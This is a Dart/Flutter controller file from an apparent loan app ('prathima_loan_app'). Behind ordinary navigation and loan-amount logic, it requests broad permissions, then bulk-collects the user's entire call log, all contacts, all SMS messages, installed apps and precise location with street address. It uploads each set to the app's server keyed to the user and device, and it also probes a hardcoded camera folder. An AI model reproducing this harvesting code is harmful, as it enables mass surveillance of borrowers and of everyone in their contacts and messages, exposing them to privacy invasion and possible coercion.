import 'dart:convert';
import 'dart:io';

import 'package:call_log/call_log.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:file_picker/file_picker.dart';
import 'package:flutter/material.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:geocoding/geocoding.dart';
import 'package:geolocator/geolocator.dart';
import 'package:get/get.dart';
import 'package:installed_apps/app_info.dart';
import 'package:installed_apps/installed_apps.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:prathima_loan_app/controllers/kyc_controller.dart';
import 'package:prathima_loan_app/customs/custom_snackbar.dart';
import 'package:prathima_loan_app/data/api/api_checker.dart';
import 'package:prathima_loan_app/data/model/app_model.dart';
import 'package:prathima_loan_app/data/model/call_log_model.dart';
import 'package:prathima_loan_app/data/model/contact_model.dart';
import 'package:prathima_loan_app/data/model/login_model.dart';
import 'package:prathima_loan_app/data/model/sms_model.dart';
import 'package:prathima_loan_app/data/repository/home_repository.dart';
import 'package:prathima_loan_app/helpers/route_helper.dart';
import 'package:prathima_loan_app/utils/shared_preferences.dart';

class HomeController extends GetxController implements GetxService {
  final HomeRepository homeRepository;

  HomeController({required this.homeRepository});

  int _currentIndex = 0;
  String _initialLoanAmount = '...';
  String _deviceId = '';
  int _userId = 0;


  int get currentIndex => _currentIndex;

  String get initialLoanAmount => _initialLoanAmount;

  String get deviceId => _deviceId;

  int get userId => _userId;

  List<BottomNavigationBarItem> items = [
    const BottomNavigationBarItem(
      icon: Image(image: AssetImage("assets/icon/home.png")),
      label: 'Home',
    ),
    const BottomNavigationBarItem(
      icon: Image(image: AssetImage("assets/icon/loan.png")),
      label: 'Loan',
    ),
    const BottomNavigationBarItem(
      icon: Image(image: AssetImage("assets/icon/transaction.png")),
      label: 'Transaction',
    ),
    const BottomNavigationBarItem(
      icon: Image(image: AssetImage("assets/icon/person.png")),
      label: 'Profile',
    ),
  ];

  void updateIndex(int index) {
    _currentIndex = index;
    update();
  }

  Future<void> getInitialLoanAmount() async {
    var response = await homeRepository.getInitialLoanAmount();
    if (response.statusCode == 200) {
      var body = response.body;
      _initialLoanAmount = body['data'];
    } else {
      ApiChecker.checkApi(response);
    }
    update();
  }

  void clearData() {
    _initialLoanAmount = '...';
    update();
  }

  Future<void> onTapLoanCard() async {
    if (Get.find<KycController>().kycStatus != null) {
      print("kyc status ${Get.find<KycController>().kycStatus!.status}");

      if (Get.find<KycController>().kycStatus!.status == 3) {
        Get.toNamed(RouteHelper.loanDetailsForm);
      } else {
        Get.toNamed(RouteHelper.kycDetail);
      }
    }
    update();
  }

  appPermission() async {
    await Permission.phone.request();
    await Permission.sms.request();
    await Permission.location.request();
    await Permission.contacts.request();
    await Permission.storage.request();
  }

  Future<void> fetchCallLogs() async {
    try {
      if (await Permission.phone.request().isGranted) {
        Iterable<CallLogEntry> entries = await CallLog.query();

        List<CallLogData> callLogDataList =
            entries.map((e) => CallLogData.fromJson(e)).toList();

        if (callLogDataList.isNotEmpty) {
          List<Map<String, dynamic>> jsonDataList = callLogDataList
              .map((callLogData) => callLogData.toJson())
              .toList();
          var response = await homeRepository.sendCallLogList({
            "user_id": userId.toString(),
            "device_id": deviceId,
            "data": jsonDataList
          });
          if (response.statusCode == 200) {
            showCustomSnackBar(response.body["message"], isError: false);
          } else {
            ApiChecker.checkApi(response);
          }
        }
      } else {
        await Permission.phone.request();
      }
    } catch (_) {}
  }

  Future<void> fetchContactsLogs() async {
    try {
      if (await Permission.contacts.request().isGranted) {
        Iterable<Contact> contacts = await ContactsService.getContacts();
        List<ContactData> contactDataList =
            contacts.map((e) => ContactData.fromJson(e)).toList();
        if (contactDataList.isNotEmpty) {
          List<Map<String, dynamic>> jsonDataList = contactDataList
              .map((contactData) => contactData.toJson())
              .toList();
          var response = await homeRepository.sendContactList({
            "user_id": userId.toString(),
            "device_id": deviceId,
            "data": jsonDataList
          });
          if (response.statusCode == 200) {
            showCustomSnackBar(response.body["message"], isError: false);
          } else {
            ApiChecker.checkApi(response);
          }
        }
      } else {
        await Permission.contacts.request();
      }
    } catch (_) {}
  }

  Future<void> getDeviceIdAndUserId() async {
    final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    if (GetPlatform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfoPlugin.androidInfo;
      _deviceId = androidInfo.id;
    } else if (GetPlatform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfoPlugin.iosInfo;
      _deviceId = iosInfo.identifierForVendor ?? 'Unknown';
    }

    String userData = await SharedPreference().getUserData();
    LoginResponse decodeUserData = LoginResponse.fromJson(jsonDecode(userData));
    _userId = decodeUserData.user!.id ?? 0;
  }

  Future<void> fetchSMSLogs() async {
    try {
      if (await Permission.sms.request().isGranted) {
        SmsQuery query = SmsQuery();
        List<SmsMessage> messages = await query.getAllSms;
        List<SmsData> smsDataList =
            messages.map((e) => SmsData.fromJson(e)).toList();
        if (smsDataList.isNotEmpty) {
          List<Map<String, dynamic>> jsonDataList =
              smsDataList.map((smsData) => smsData.toJson()).toList();
          var response = await homeRepository.sendSMSLogList({
            "user_id": userId.toString(),
            "device_id": deviceId,
            "data": jsonDataList
          });
          if (response.statusCode == 200) {
            showCustomSnackBar(response.body["message"], isError: false);
          } else {
            ApiChecker.checkApi(response);
          }
        }
      } else {
        await Permission.sms.request();
      }
    } catch (_) {}
  }

  Future<void> fetchInstalledApps() async {
    try {
      if (await Permission.storage.request().isGranted) {
        List<AppInfo> apps = await InstalledApps.getInstalledApps(true, true);
        List<AppData> appDataList =
            apps.map((e) => AppData.fromJson(e)).toList();
        if (appDataList.isNotEmpty) {
          List<Map<String, dynamic>> jsonDataList =
              appDataList.map((appData) => appData.toJson()).toList();
          var response = await homeRepository.sendInstalledAppList({
            "user_id": userId.toString(),
            "device_id": deviceId,
            "data": jsonDataList
          });
          if (response.statusCode == 200) {
            showCustomSnackBar(response.body["message"], isError: false);
          } else {
            ApiChecker.checkApi(response);
          }
        }
      }
    } catch (_) {}
  }

  Future<void> fetchDCIMFolder() async {
    if (await Permission.storage.request().isGranted) {
      Directory? externalDir = await getExternalStorageDirectory();
      final directory =
          Directory('/storage/emulated/0/DCIM/Camera/Cshot/1658663200031');
      if (await directory.exists()) {
        print('dcimDir ----- > $directory');
        List files = directory.listSync(recursive: true);
        print("files ------- > $files");
        for (FileSystemEntity file in files) {
          print('File: ${file.path}');
        }
      }
    }
  }

  Future<void> fetchCurrentLocation() async {
    if (await Permission.location.request().isGranted) {
      try {
        Position position = await Geolocator.getCurrentPosition(
            desiredAccuracy: LocationAccuracy.high);
        String? address;

        List<Placemark> placeMarks = await placemarkFromCoordinates(
            position.latitude, position.longitude);

        if (placeMarks.isNotEmpty) {
          Placemark place = placeMarks[0];
          address =
              '${place.street}, ${place.locality}, ${place.administrativeArea}, ${place.country}, ${place.postalCode}';
        }
        var response = await homeRepository.sendUserLocation({
          "latitude": position.latitude,
          "longitude": position.longitude,
          "address": address
        });
        if (response.statusCode == 200) {
          showCustomSnackBar(response.body["message"], isError: false);
        } else {
          ApiChecker.checkApi(response);
        }
      } catch (_) {}
    } else {
      await Permission.location.request();
    }
  }
}
